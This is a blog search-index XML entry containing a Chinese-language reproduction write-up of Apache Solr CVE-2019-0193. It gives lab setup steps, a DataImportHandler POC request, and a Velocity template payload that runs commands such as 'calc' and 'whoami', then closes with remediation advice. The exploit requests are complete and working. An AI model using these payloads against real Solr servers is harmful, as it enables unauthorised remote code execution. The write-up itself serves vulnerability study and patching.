<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CVE-2019-0193：Apache Solr 远程代码执行漏洞</title>
      <link href="/2020/04/11/Apache-solr/"/>
      <url>/2020/04/11/Apache-solr/</url>
      
        <content type="html"><![CDATA[<h2 id="反弹计算器"><a href="#反弹计算器" class="headerlink" title="反弹计算器"></a>反弹计算器</h2><p>1.影响范围：Apache Solr &lt; 8.2.0</p><p>2.环境搭建</p><p>下载地址<a href="https://www.apache.org/dyn/closer.lua/lucene/solr/7.7.2/solr-7.7.2.zip" target="_blank" rel="noopener">https://www.apache.org/dyn/closer.lua/lucene/solr/7.7.2/solr-7.7.2.zip</a><br>在本地解压，进入solr-7.7.2目录，执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ .\bin\solr.cmd -e dih （前提：java环境）</span><br></pre></td></tr></table></figure><p>然后访问<a href="http://localhost:8983/solr即可访问环境" target="_blank" rel="noopener">http://localhost:8983/solr即可访问环境</a><br><img src="/2020/04/11/Apache-solr/apache_solr_1.jpg" alt="BP"></p><ol start="3"><li>漏洞利用</li></ol><p>在Burp中发送以下POC即可执行命令弹出计算器，下面的 <your_core_name> 需要替换为你获取到的 core 的 name（共两处）</your_core_name></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST /solr/&lt;your_core_name&gt;/dataimport HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8983</span><br><span class="line">Content-Length: 763</span><br><span class="line">User-Agent: Mozilla/5.0</span><br><span class="line">Content-type: application/x-www-form-urlencoded</span><br><span class="line">Connection: close</span><br><span class="line">​</span><br><span class="line"><span class="built_in">command</span>=full-import&amp;verbose=<span class="literal">false</span>&amp;clean=<span class="literal">false</span>&amp;commit=<span class="literal">true</span>&amp;debug=<span class="literal">true</span>&amp;core=&lt;your_core_name&gt;&amp;name=dataimport&amp;dataConfig=</span><br><span class="line">&lt;dataConfig&gt;</span><br><span class="line">&lt;dataSource <span class="built_in">type</span>=<span class="string">"URLDataSource"</span>/&gt;</span><br><span class="line">&lt;script&gt;&lt;![CDATA[</span><br><span class="line"><span class="keyword">function</span> poc(row)&#123;</span><br><span class="line">var process= java.lang.Runtime.getRuntime();</span><br><span class="line">process.exec(<span class="string">"calc"</span>);</span><br><span class="line"><span class="built_in">return</span> row;</span><br><span class="line">&#125;</span><br><span class="line">]]&gt;&lt;/script&gt;</span><br><span class="line">&lt;document&gt;</span><br><span class="line">&lt;entity name=<span class="string">"stackoverflow"</span></span><br><span class="line">url=<span class="string">"https://stackoverflow.com/feeds/tag/solr"</span></span><br><span class="line">processor=<span class="string">"XPathEntityProcessor"</span></span><br><span class="line">forEach=<span class="string">"/feed"</span></span><br><span class="line">transformer=<span class="string">"script:poc"</span> /&gt;</span><br><span class="line">&lt;/document&gt;</span><br><span class="line">&lt;/dataConfig&gt;</span><br></pre></td></tr></table></figure><p>4.复现效果</p><p><img src="/2020/04/11/Apache-solr/apache_solr_2.jpg" alt="BP"></p><p>5.使用命令solr stop -all关闭solr</p><h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><p>1.进入solr-7.7.2的bin目录，使用命令solr start开启solr</p><p>2.访问<a href="http://127.0.0.1:8983/solr" target="_blank" rel="noopener">http://127.0.0.1:8983/solr</a></p><p>若发现Core admin一栏无core，可使用命令 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">solr create -c &lt;name&gt;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/11/Apache-solr/apache_solr_3.jpg" alt="BP"></p><p><img src="/2020/04/11/Apache-solr/apache_solr_4.jpg" alt="BP"></p><p>3.访问<a href="http://127.0.0.1:8983/solr/test/config" target="_blank" rel="noopener">http://127.0.0.1:8983/solr/test/config</a></p><p><img src="/2020/04/11/Apache-solr/apache_solr_5.jpg" alt="BP"></p><p>4.Apache Solr默认集成VelocityResponseWriter插件，该插件初始化参数中的params.resource.loader.enabled默认值设置为false，但是可以通过POST请求直接修改集合设置，将其设置为true，然后就可以构造特殊的GET请求来实现远程代码执行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /solr/<span class="built_in">test</span>/config HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8983</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 259</span><br><span class="line">​</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"update-queryresponsewriter"</span>: &#123;</span><br><span class="line">    <span class="string">"startup"</span>: <span class="string">"lazy"</span>,</span><br><span class="line">    <span class="string">"name"</span>: <span class="string">"velocity"</span>,</span><br><span class="line">    <span class="string">"class"</span>: <span class="string">"solr.VelocityResponseWriter"</span>,</span><br><span class="line">    <span class="string">"template.base.dir"</span>: <span class="string">""</span>,</span><br><span class="line">    <span class="string">"solr.resource.loader.enabled"</span>: <span class="string">"true"</span>,</span><br><span class="line">    <span class="string">"params.resource.loader.enabled"</span>: <span class="string">"true"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/11/Apache-solr/apache_solr_6.jpg" alt="BP"></p><p>5.然后使用构造好的payload进行代码执行攻击即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8983/solr/<span class="built_in">test</span>/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set(<span class="variable">$x</span>=%27%27)+%23set(<span class="variable">$rt</span>=<span class="variable">$x</span>.class.forName(%27java.lang.Runtime%27))+%23set(<span class="variable">$chr</span>=<span class="variable">$x</span>.class.forName(%27java.lang.Character%27))+%23set(<span class="variable">$str</span>=<span class="variable">$x</span>.class.forName(%27java.lang.String%27))+%23set(<span class="variable">$ex</span>=<span class="variable">$rt</span>.getRuntime().<span class="built_in">exec</span>(%27whoami%27))+<span class="variable">$ex</span>.waitFor()+%23set(<span class="variable">$out</span>=<span class="variable">$ex</span>.getInputStream())+%23foreach(<span class="variable">$i</span>+<span class="keyword">in</span>+[1..<span class="variable">$out</span>.available()])<span class="variable">$str</span>.valueOf(<span class="variable">$chr</span>.toChars(<span class="variable">$out</span>.<span class="built_in">read</span>()))%23end</span><br></pre></td></tr></table></figure><p><img src="/2020/04/11/Apache-solr/apache_solr_7.jpg" alt="BP"></p><p>6.使用命令solr stop -all关闭solr</p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>1.建议用户设置solr后台为登陆认证，限制互联网用户对solr admin的访问<br>2.删除params.resource.loader.enabled的配置<br>3.时刻关注solr官方，出现补丁或新版本要赶快更新</p>]]></content>
      
      
      
        <tags>
            
            <tag> Apache </tag>
            
            <tag> solr </tag>
            
            <tag> CVE-2019-0193 </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
